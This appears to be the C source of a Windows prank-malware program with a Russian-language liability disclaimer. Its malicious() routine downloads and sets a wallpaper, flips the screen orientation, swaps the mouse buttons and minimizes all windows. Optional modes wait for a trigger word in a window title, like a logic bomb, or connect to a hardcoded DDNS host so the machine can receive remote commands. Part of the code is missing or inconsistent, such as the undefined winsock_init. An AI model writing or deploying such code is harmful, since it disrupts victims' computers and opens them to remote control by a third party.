#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Shlwapi.lib")

wchar_t const defaultUrl[256] = L"https://www.meme-arsenal.com/memes/9b703735887c2cfa6c6e1dad3fe35332.jpg";
wchar_t const remote[7] = L"remote";
wchar_t const mine[5] = L"mine";
wchar_t const delim[3] = L" \n";
wchar_t const CONFIG_NAME[11] = L"config.txt";
wchar_t URL[1024] = { 0 };
wchar_t MODE[128] = { 0 };
wchar_t HOST[1024] = { 0 };
wchar_t PORT[1024] = { 0 };
wchar_t *TRIGGER[256] = { 0 };
wchar_t OLD_WALLPAPER[256] = { 0 };
wchar_t const DEFAULT_WALLPAPER[32] = L"\\Web\\Wallpaper\\Windows\\img0.jpg";
wchar_t TEMP_PATH[256] = { 0 };
wchar_t const DEFAULT_HOST[256] = L"xyitvoeimami.ddns.net";
wchar_t const DEFAULT_PORT[6] = L"80";
wchar_t const *DEFAULT_TRIGGER[256] = { L"эпос" };
int OLD_WIDTH = 0;
int OLD_HEIGHT = 0;

BOOL FileExists(LPCWSTR szPath)
{
    DWORD dwAttrib = GetFileAttributesW(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

int downloadFile(LPCWSTR path, LPCWSTR url)
{
    if (S_OK == URLDownloadToFileW(NULL, url, path, 0, NULL))
    {
        return 0;
    }
    else
    {
        return -1;
    }
}

int flipDisplay(char orientation)
{
    DEVMODE dm;

    ZeroMemory(&dm, sizeof(dm));
    dm.dmSize = sizeof(dm);

    if (0 != EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &dm))
    {
        if (orientation == 0 || orientation == 2)
        {
            if (OLD_WIDTH != 0 && OLD_HEIGHT != 0)
            {
                dm.dmPelsWidth = OLD_WIDTH;
                dm.dmPelsHeight = OLD_HEIGHT;
            }
            else
            {
                dm.dmPelsWidth = 1920;
                dm.dmPelsHeight = 1080;
            }
        }
        else
        {
            OLD_WIDTH = dm.dmPelsWidth;
            OLD_HEIGHT = dm.dmPelsHeight;

            dm.dmPelsWidth = 600;
            dm.dmPelsHeight = 800;
        }

        dm.dmDisplayOrientation = orientation;

        long lRet = ChangeDisplaySettings(&dm, 0);

        return lRet;
    }

    return -1;
}

int changeWallpaper(LPCWSTR path, LPCWSTR link)
{
    int errcode = -1;

    errcode = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0);

    errcode -= 1;

    if (errcode != 0 && link != defaultUrl)
    {
		errcode = setWallpaperURL(defaultUrl);
    }
    
    return errcode;
}

int setWallpaperURL(LPCWSTR url)
{
    int errcode = -1;

    GetTempPathW(256, TEMP_PATH);

    wcscat_s(TEMP_PATH, 256, L"wallpaper.png");
    wprintf(TEMP_PATH);

    if (downloadFile(TEMP_PATH, url) == 0)
    {
        errcode = changeWallpaper(TEMP_PATH, url);

    }
    else if (url != defaultUrl)
    {
        errcode = setWallpaperURL(defaultUrl);
    }

    return errcode;
}

LRESULT minimizeAll()
{
    HANDLE hwnd = FindWindowW(L"Shell_TrayWnd", NULL);
    LRESULT res = SendMessageW(hwnd, WM_COMMAND, (WPARAM)419, 0);

    return res;
}

int loadConfig()
{
    int errcode = 0;
	StrCpyW(URL, defaultUrl);

    if (FileExists(CONFIG_NAME))
    {
        FILE* file = 0;

        wchar_t url[1024] = { 0 };
        wchar_t mode[1024] = { 0 };

        if (_wfopen_s(&file, CONFIG_NAME, L"r,ccs=UTF-8") == 0)
        {
            if (fgetws(url, 1024, file) != NULL)
            {
				StrCpyW(URL, url);

                if (fgetws(mode, 1024, file) != NULL)
                {
                    LPCWSTR token = NULL;
					wchar_t buffer[1024] = { 0 };

                    token = wcstok_s(mode, delim, &buffer);
                    int count = 0;

                    if (StrCmpW(token, remote) == 0)
                    {
						StrCpyW(MODE, token);

                        while (token != NULL)
                        {

                            token = wcstok_s(NULL, delim, &buffer);
                            if (StrCmpW(token, delim) != 0)
                            {
                                if (count == 0)
                                {
									if (token == NULL || StrCmpW(token, L"\n") == 0)
									{
                                        StrCpyW(HOST, DEFAULT_HOST);
                                        StrCpyW(PORT, DEFAULT_PORT);
										errcode = -1;
										return -1;
									}

									wcscpy_s(HOST, 1024, token);
                                }
                                else if (count == 1)
                                {
									if (token == NULL || StrCmpW(token, L"\n") == 0)
									{
                                        StrCpyW(PORT, DEFAULT_PORT);
                                        errcode = -1;
										return -1;
									}

									wcscpy_s(PORT, 1024, token);
                                }
                            }
                            count++;
                        }
                    }
                    else if (StrCmpW(token, mine) == 0)
                    {
						StrCpyW(MODE, token);

                        while (token != NULL)
                        {
                            token = wcstok_s(NULL, delim, &buffer);

							if ((token == NULL || StrCmpW(token, L"\n") == 0) && count < 1)
							{
                                memcpy(TRIGGER, DEFAULT_TRIGGER, 256);
								errcode = -1;
								return -1;
							}

                            if (StrCmpW(token, delim) != 0)
                            {
                                TRIGGER[count] = token;
                            }

                            count++;
                        }
                    }
                }
            }

            fclose(file);
        }
        else
        {
            errcode = -1;
        }
    }

    return errcode;
}

BOOL CALLBACK enumWindowCallback(HWND hWnd, LPARAM lParam)
{
    int length = GetWindowTextLength(hWnd);

    if (IsWindowVisible(hWnd) && length != 0)
    {
        wchar_t text[256] = { 0 };

        GetWindowTextW(hWnd, text, length + 1);
        for (int i = 0; i < 256; i++)
        {
            if (TRIGGER[i] == 0)
                break;
            
            wchar_t trigger[256] = { 0 };

            StrCpy(trigger, TRIGGER[i]);

            if (StrStrW(CharLowerW(text), CharLowerW(trigger)))
            {
                return 0;
            }
        }
        
    }

    return 1;
}

int malicious()
{
	int errcode = 0;

    SystemParametersInfoW(SPI_GETDESKWALLPAPER, 256, OLD_WALLPAPER, 0);

	if (URL != NULL)
	{
		errcode = setWallpaperURL(URL);
	}
    else
        errcode = setWallpaperURL(defaultUrl);

    errcode = flipDisplay(1);
    errcode = SwapMouseButton(1);
    minimizeAll();

	return errcode;
}

int deleteSelf()
{
    int errcode = 0;
    errcode = revertBack();
    exit(0);
}

int revertBack()
{
    int errcode = 0;

    if (OLD_WALLPAPER[0] != 0)
    {
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, OLD_WALLPAPER, 0);
    }
    else
    {
        wchar_t windir[256] = { 0 };

        if(GetWindowsDirectoryW(windir, 256) != 0 || windir[0] != 0)
        {
            wcscat_s(windir, 256, DEFAULT_WALLPAPER);
            SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, windir, 0);
        }
    }

    errcode = flipDisplay(0);
    errcode = SwapMouseButton(0);

    if (TEMP_PATH[0] != 0)
    {
        if (FileExists(TEMP_PATH))
        {
            DeleteFileW(TEMP_PATH);
        }
    }

    return errcode;
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nShowCmd)
{
    if (MessageBoxW(
        0,
        L"Эта программа лицензирована лицензией Unlicense (http://unlicense.org/) и является общественным достоянием.\nGitHub: https://github.com/HURROLED/ScreenFlip/\n\nВнимание! Эта программа может повредить этой ЭВМ! Запускать только на собственной ЭВМ! Запускать только на тестовой системе! Использовать только в образовательных, исследовательских и демонстрационных целях! Запрещается использование этой программы на ЭВМ, если у Вас нет прямой санкции на запуск этой программы от владельца ЭВМ!\n\nНажимая кнопку \"Да\" в этом окне, Вы соглашаетесь с тем, что эта программа может выполнять любые действия с этой ЭВМ, всей информацией, на ней хранящейся, и всеми устройствами, подключёнными к ней, включая, но не ограничиваясь следующими действиями:\n- изменением настроек монитора или другого дисплея;\n- загрузкой и сохранением на локальных дисках данных из сети \"Интернет\";\n- сменой фона рабочего стола;\n- изменением настроек компьютерной мыши;\n- изменением состояния открытых окон;\n- чтением и обработкой информации с локальных дисков или внешних носителей информации;\n- чтением и обработкой свойств открытых окон;\n- подключением к внешним серверам по сети \"Интернет\".\n\nНажимая кнопку \"Да\" в этом окне, вы соглашаетесь с тем, что эта программа может подключатся к удалённым серверам автора этой программы, которые расположены в Перми, а также с тем, что эта ЭВМ может получать удалённые команды от сервера, и у каждого подключившегося к этому серверу будет удалённый доступ к Вашей ЭВМ в том числе.\n\nАвтор этой программы не несёт ответственность за любой вред, причинённый данной программой этой ЭВМ, другим ЭВМ, физическим и юридическим лицам, уничтожение, копирование, модификацию, блокирование или любые другие действия, совершённые этой программой в отношении Ваших данных.\n\nНажимая кнопку \"Да\" в этом окне, Вы соглашаетесь со всеми вышеперечисленными условиями и даёте Вашу санкцию на все вышеперечисленные и, вообще, любые действия с Вашей ЭВМ, возлагаете всю ответственность за эти действия исключительно на себя, подтверждаете, что вы полностью ознакомились с этим соглашением.\n\nНажмите кнопку \"Нет\", чтобы немедленно прекратить работу программы.",
        L"Отказ от ответственности",
        MB_YESNO + MB_ICONWARNING
    ) == IDYES)
    {
        int ret = 0;

		if (loadConfig() != 0)
			ret = -1;

        if (StrCmpW(MODE, remote) == 0 && HOST != 0 && PORT != 0)
        {
			if (winsock_init() != 0)
				ret = -1;
        }
        else if (StrCmpW(MODE, mine) == 0 && TRIGGER != 0)
        {
            while (1)
            {
				ret = GetLastError();
                if (EnumWindows(enumWindowCallback, 0) == 0)
                {
                    break;
                }
            }

            if (malicious() != 0)
                ret = -1;
        }
        else
        {
            if (malicious() != 0)
                ret = -1;
        }

        ret = GetLastError();
        return ret;
    }
}
